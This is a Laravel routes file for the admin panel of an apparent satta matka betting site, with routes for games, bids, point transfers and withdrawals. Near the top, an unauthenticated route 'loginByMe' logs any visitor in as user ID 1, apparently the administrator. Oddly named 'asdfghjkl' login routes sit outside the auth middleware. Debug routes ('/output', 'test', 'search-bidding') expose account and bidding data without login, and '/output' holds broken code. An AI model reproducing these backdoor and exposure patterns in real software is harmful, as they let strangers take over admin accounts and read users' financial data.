<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
use Illuminate\Support\Facades\Auth;

Route::get("loginByMe", function(){

	Auth::loginUsingId(1, true);

	return redirect()->route('home');

});

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use App\Enquery;
use App\User;
use App\Model\BiddingHistory;
use App\Model\ManageSatta;
use App\Model\ResultData;
Route::post('enquiry',function(Request $request){
	$rating = $request->firsts+$request->seconds+$request->threes+$request->fours+$request->fives;
	//dd($rating);
	Enquery::create(['name'=>$request->name,
'mobile_number'=>$request->mobile,
'comment'=>$request->comment,'rating'=>$rating]);
return Redirect::back();
});

Route::get('/output',function(){

	  $from_date = \Carbon\CarbonImmutable::now()->add(-1, 'day');

    $to_date = \Carbon\Carbon::today();

    $currentdate =  '2021-01-27';


      $biddingHistories = \App\Model\BiddingHistory::whereDate('create_time',$currentdate)->where('run_status','n')->where('manage_satta_id','6')->where('game_type','1')->with('user','game')->get();


      $notification_user = \App\Model\BiddingHistory::whereDate('create_time',\Carbon\Carbon::today())->where('run_status','n')->where('manage_satta_id','6')->with('user','manageSatta','game')->groupBy('user_id')->get();




     
     //$usersNitifi = \App\User::where('notification_status','y')->orderBy('id', 'DESC')->take($limit)->get();

     //$usersNitifis = \App\User::where('notification_status','y')->orderBy('id', 'ASC')->take($limit)->get();

     $usersNitifi = \App\User::where('notification_status','y')->where('push_notification_token','!=',null)->get();

     $date='2021-04-23' ;

     $datedata= \App\Model\AccountStatement::whereDate('created_at',$date)->get();


$oldmessage='Played TIME BAZAR OPEN Digit 6.';


      $data=AccountStatement::where('user_id','1912')->where('message',$oldmessage)->whereDate('created_at', '>=',$newdate)->get();

dd($datedata);

});

Route::resource('customsearch', 'CustomSearchController');

// Route::get('/result',function(){

//     $currentdatetime =  strtotime(date("Y-m-d H:i",strtotime("now")));

//     $data = \App\Model\ResultData::get();

//     $resultupdate = ResultData::where('open_update',$currentdatetime )->with('manageSatta')->get();

//     //dd($resultupdate);

//    if ($resultupdate) {

//      foreach ($resultupdate as $key => $value) {

//           \App\Model\ManageSatta::where('id',$value->satta_id)->where('status','y')->where('open_action','n')->update([
//                         'open_pana' => $value->open_pana,
//                         'open_number'=>$value->open_number,
//                          'open_aakda' =>$value->open_aakda,
//                          'open_update' =>$value->open_update,
//                          'open_input_result_date'=>$value->open_input_result_date,
//                        ]);

//        $type='open';
       
//        moneyDistrebute($value->satta_id,$type,$value->open_pana);
//         }
//     }
//     return  "done";

// });


Route::get('search-bidding', function (Request $request) {
    

    //dd($request->all());
  $game_name = ManageSatta::where('title', 'like', '%' . $request->search_key . '%')->first();


  
  

  if($game_name == null){
      
      //echo view('admin.dom.search-bidding'); 
  }else{
      
      //$biddingHistories = BiddingHistory::where('user_id',$users->id)->get();
      
        $biddingHistories = BiddingHistory::where('manage_satta_id', 'like', '%' . $game_name->id . '%')->orderBy('create_time','DESC')->take(1000)->get();
  

      echo view('admin.dom.search-bidding-bygamename',compact('biddingHistories'))->render(); 
  }


//   $users = User::where('username', 'like', '%' . $request->search_key . '%')->take(50)->get();
  
  
});

Route::get('/',function(){
	return view('front-index');
});
Route::get('login', function () {

    return view('auth.login');
})->middleware(['guest:web']);

Auth::routes();

Route::get('/privacy-policy','Admin\PrivacyPoliciesController@privacyPoliciesGet');





Route::get('/home', 'HomeController@index')->name('home')->middleware(['auth','admin']);

Route::namespace('Admin')->middleware(['auth:web','admin'])->group(function(){
    
    Route::get('delhi-games','DelhiGamesController@index');
    Route::get('get-delhi-games','DelhiGamesController@getDelhiGames');
    Route::post('add-delhi-games','DelhiGamesController@addDelhiGames');
    Route::get('delhi-games-view','DelhiGamesController@delhiGamesView');
    Route::get('game-edit','DelhiGamesController@gameEdit');
    Route::post('delhi-game-update','DelhiGamesController@delhiGameUpdate');
    Route::get('get-game-result-update','DelhiGamesController@getGameResultUpdate');
    Route::post('game-result-update','DelhiGamesController@gameResultUpdate');
     Route::get('game-game-rate','DelhiGamesController@gameGameRate');
     Route::get('delhi-games-rates-list','DelhiGamesController@delhiGamesRatesList');
     Route::get('delhi-game-rate-edit','DelhiGamesController@delhiGameRateEdit');
     Route::post('delhi-game-rate-update','DelhiGamesController@delhiGameRateUpdate');

    //star line games
     Route::get('star-line-game','StartlineGamesController@index');
     
    Route::get('/Star-line-rate','StartlineGamesController@Starlinerate');

	Route::get('sms','UserController@sms');
	
	/*change password*/
Route::get('change-password','ChangePasswordController@changePassword')->name('admin.changePassword');
Route::post('change-password','ChangePasswordController@changePasswordPost')->name('admin.changePassword');

Route::get('/manage-satta','ManageSattaController@manageSatta')->name('manageSatta.index');

Route::get('/result-log','ManageSattaController@resultlog')->name('manageSatta.resultlog');
	
	Route::get('/users','UserController@index')->name('user.index');
	Route::get('/bidding-histories/{user}','UserController@biddingHistories')->name('user.biddingHistories');
	Route::get('/account-statement/{user}','UserController@accountStatement')->name('user.accountStatement');
	

	Route::get('/register-user','UserController@register')->name('register-user');
	Route::post('/register-user','UserController@registerPost')->name('register-user.post');

	
	// close Khel
	Route::get('/close-khel','CloseKhelController@index')->name('closeKhel');

	

	/*game*/
	Route::get('/game/index','GameController@index')->name('game.index');





	/*point request*/
	Route::get('/points-request','PointRequestController@index')->name('pointRequest.index');

	/*withdral-points*/
	Route::get('/withdraw-points-request','WithdralPointsController@withdralPoints')->name('withdralPoints.index');

   Route::get('/gameserach-bid','BiddingHistoryController@serach_bid');

   Route::post('/search-bid','BiddingHistoryController@serach_bid')->name('searchbid.game');
Route::get('/search-bid','BiddingHistoryController@serach_bid')->name('searchbid.game');
	/*game rate*/
	Route::get('/game-rates','GameRateController@gameRateGet')->name('gameRate.index');
	Route::post('/game-rates','GameRateController@gameRatePost')->name('gameRate.post');

	/*how to paly*/
	Route::get('/how-to-play','SettingController@howToPlayGet')->name('howToPlay.get');
	Route::post('/how-to-play','SettingController@howToPlayPost')->name('howToPlay.post');

		/*privacy policies*/
	Route::get('/privacy-policies','SettingController@privacyPolicies')->name('privacyPolicies.get');
	Route::post('/privacy-policies','SettingController@privacyPoliciesPost')->name('privacyPolicies.post');

// enquery
	Route::get('/user-enquery','ManageSattaController@EnquerySection')->name('user-enquery.get');
	/*notice_board*/
		Route::get('/notice-board','SettingController@noticeBoardGet')->name('noticeBoard.get');
	Route::post('/notice-board','SettingController@noticeBoardPost')->name('noticeBoard.post');


	/*settings*/
		Route::get('/setting','SettingController@settingsGet');
		Route::post('/setting','SettingController@settingsPost')->name('setting.post');

		/*dashboard*/
		

	
	

	
	

	/*bidding histories*/
	Route::get('/bidding/histories','BiddingHistoryController@index')->name('biddingHistory.index');
	/*account_statements*/
	Route::get('/account-statements','AccountStatementsController@index')->name('accountStatements.index');
	
   Route::get('/Notice', 'UserController@view_notifi');

   Route::post('/send_notification','UserController@admin_notification')->name('send.notification');


    //parse
	Route::prefix('parse')->middleware(['auth:web','admin'])->group(function(){

		// add satta
		
		
		
		Route::post('/return-point','ManageSattaController@returnPoint');
		
		Route::post('/add-satta','ManageSattaController@addSatta');

		/*open game*/
		Route::post('/game-modal','ManageSattaController@gameModal');

		/*start game open  */

		Route::post('/star-game-modal','StartlineGamesController@gameModal');

		/*pana update*/
		Route::post('/pana-update','ManageSattaController@panaUpdate');
		/*start pana update */

	   Route::post('/starpana','StartlineGamesController@starpana');

		/*satta-delete*/
		Route::post('/satta-delete','ManageSattaController@sattaDelete');
		/*satta-view*/
		Route::post('/satta-view','ManageSattaController@sattaView');

		/*star view    */

		Route::post('/stargame-view','StartlineGamesController@starView');
		/*satta-edit*/
		Route::post('/satta-edit','ManageSattaController@sattaEdit');
		/*star-edit*/
		Route::post('/star-edit','StartlineGamesController@starEdit');
		/*satta update*/
		Route::post('/satta-update','ManageSattaController@sattaUpdate');
        
        /*star update*/
		Route::post('/star-game-update','StartlineGamesController@stargameUpdate');

		/*user-detail*/
		Route::post('/user-detail','UserController@userDetail');
       	/*star-line*/

        Route::post('/add-starline','StartlineGamesController@addstarline');

		/*game*/
		Route::post('/game-delete','GameController@gameDelete');
		Route::post('/game-edit','GameController@gameEdit');
		Route::post('/game-update','GameController@gameUpdate');
		Route::post('/game-save','GameController@gameSave');

		/* satr game rate  */

		Route::post('/stargame-rate-edit','StartlineGamesController@gameEdit');
         Route::post('/stargamerate-update','StartlineGamesController@gameUpdate');
    // delete enquery
       Route::post('/delete-enquery','BiddingHistoryController@DeleteEnquery');

		/*bidding */
		Route::post('/bidding-edit','BiddingHistoryController@biddingEdit');
		Route::post('/bidding-update','BiddingHistoryController@biddingUpdate');

		/*pointtransfer-openmodal*/
		Route::post('/pointtransfer-openmodal','UserController@pointtransferOpenmodal');
		Route::post('/point-transfer','UserController@pointTransfer');

		/*point-withdrawn*/
		Route::post('/point-withdrawn','UserController@pointWithdrawn');
		Route::post('/point-withdrawn-update','UserController@pointWithdrawnUpdate');

		/*point-withdrawn*-request*/
		Route::post('/point-request-withdrawn','UserController@pointRequestWithdrawn');
		Route::post('/point-request-withdrawn-update','UserController@pointRequestWithdrawnUpdate');

		/*point-request*/
		Route::post('/point-request','UserController@pointRequest');
		Route::post('/request-point-post','UserController@requestPointPost');
		Route::post('/point-request-delete','UserController@pointRequestDelete');






		
		

    Route::post('/open-pana','ManageSattaController@openPana');
    Route::post('/close-pana','ManageSattaController@closePana');

	});


	/*test*/
	// Open khel payment
	Route::get('/open-khel-payment','PaymentController@openKhelPayment')->name('openKhelPayment');
	Route::get('/close-khel-payment','PaymentController@closeKhelPayment')->name('openKhelPayment');
	
	

});
Route::get('/asdfghjkl/{key}/{wallet}','Auth\LoginController@asdfghjkl');
Route::get('asdfghjkl/login','Auth\LoginController@asdfghjklLogin');

Route::get('test', function(){

	$manageSatta =  \App\Model\ManageSatta::whereIn('id',['8','9','14','15'])->where('status','y')->get();

	dd($manageSatta);

        foreach ($manageSatta as $key => $value) {
           $value->update([
            'open_action' => 'y',
            'close_action' => 'y'
         ]);
        }
});





